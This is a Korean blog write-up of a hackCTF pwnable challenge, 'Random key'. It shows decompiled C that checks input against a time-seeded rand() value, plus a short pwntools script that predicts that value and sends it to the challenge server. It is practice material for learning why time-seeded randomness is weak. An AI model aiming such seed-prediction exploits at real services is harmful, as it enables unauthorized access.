---
layout: post
title:  "[hackCTF]Random key"
date:   2020-02-18
---

hackCTF pwnable 15번째 문제

![favicon](https://drive.google.com/uc?id=1EPkDaLZatWWYaPyJ3wVlOrAu-eubvG9c)

## ida - main
```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  int v4; // [rsp+0h] [rbp-10h]
  int v5; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v6; // [rsp+8h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  setbuf(_bss_start, 0LL);
  v4 = 0;
  v3 = time(0LL); // 1970.01.01부터 현재까지 흐르는 초를 v3에 저장한다
  srand(v3); // v3를 기반으로 난수를 초기화한다.
  v5 = rand(); // srand를 바탕으로 난수를 생성한다.
  puts("============================");
  puts(asc_400948);
  puts("============================");
  printf("Input Key : ", 0LL, *(_QWORD *)&v4, v6);
  __isoc99_scanf("%d", &v4);
  if ( v5 == v4 )
  {
    puts("Correct!");
    system("cat /home/random/flag"); // flag 출력
    exit(0);
  }
  puts("Nah...");
  exit(0);
}
```
랜덤으로 만들어진 v5와 입력한 값이 같다면 flag를 출력한다. time(0)을 기준으로 v5가 만들어지므로 똑같은 seed로 random 값을 만든다면 v5와 만든 값이 같을 것이다.

## exploit.py
```python
#!/usr/bin/python
from pwn import *
from ctypes import *

p = remote('ctf.j0n9hyun.xyz', 3014)

clib = cdll.LoadLibrary('libc.so.6')
mylib = cdll.LoadLibrary('%s/mylib.so' % os.getcwd())

random = mylib.main()

p.sendline(str(random))

p.interactive()
```

## 결과
![1401](https://drive.google.com/uc?id=1c29YhzXiygH5fvEJk--Dkb5xEoBiBW7d)

## 참고
<a href="http://egloos.zum.com/mcchae/v/11024689">python에서 c 코드 실행하기</a>  
<a href="https://edu.goorm.io/learn/lecture/201/%EB%B0%94%EB%A1%9C-%EC%8B%A4%ED%96%89%ED%95%B4%EB%B3%B4%EB%A9%B4%EC%84%9C-%EB%B0%B0%EC%9A%B0%EB%8A%94-c%EC%96%B8%EC%96%B4/lesson/12382/%EB%82%9C%EC%88%98-%EB%9E%9C%EB%8D%A4-%EB%A7%8C%EB%93%A4%EA%B8%B0">rand 함수</a>
